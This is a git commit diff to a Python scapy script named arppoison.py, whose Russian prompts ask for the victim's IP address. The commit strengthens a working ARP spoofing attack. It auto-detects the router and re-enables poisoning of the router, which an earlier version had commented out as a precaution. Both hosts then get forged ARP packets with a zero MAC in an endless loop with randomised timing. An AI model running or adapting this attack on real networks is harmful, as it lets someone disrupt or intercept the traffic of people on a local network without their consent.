bf8b754b86f9c14fc9b31020d7230b45b6c8cbec
t-tiktok <ilya81583@gmail.com>
2025-03-08 21:48:15 +0500

    Update arppoison.py

--- arppoison.py
+++ arppoison.py
@@ -6,29 +6,21 @@ scapy.conf.iface = "wlan0"
 
 
 def poison(target, router, targetMAC):
-    # Ethernet layer with destination MAC and source MAC
-    ether = scapy.Ether(dst=targetMAC)
-    arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=2)
-    packet = ether/arp_reply  # Combine Ethernet and ARP layers
-    scapy.send(packet, verbose=0)
+    arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=1)
+    scapy.send(arp_reply, verbose=0)
 
 FAKE_MAC = "00:00:00:00:00:00"
 target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
-router = input("Введите адрес роутера: ")
+router = scapy.conf.route.route("0.0.0.0")[2]
 
 
-while True:
-    targetMAC = scapy.getmacbyip(target)
-    routerMAC = scapy.getmacbyip(router)
 
-    if targetMAC is None or routerMAC is None:
-        print("[!] Could not resolve MAC addresses. Exiting.")
-        break  # Or handle the error in a more robust way (retry, etc.)
+while 1:
 
-    targetMAC = str(targetMAC)
-    routerMAC = str(routerMAC)
+	targetMAC = str(scapy.getmacbyip(target))
+	routerMAC = str(scapy.getmacbyip(router))
+	print("[ARP] -",targetMAC,routerMAC)
+	poison(target, router, targetMAC)
+	poison(router,target, routerMAC)
+	time.sleep(random.uniform(0.3, 1.7))
 
-    print("[ARP] -", targetMAC, routerMAC)
-    poison(target, router, targetMAC)
-    #poison(router, target, routerMAC) #Commented out for simplicity and to avoid unintentional poisoning of the router
-    time.sleep(random.uniform(0.3, 1.7))
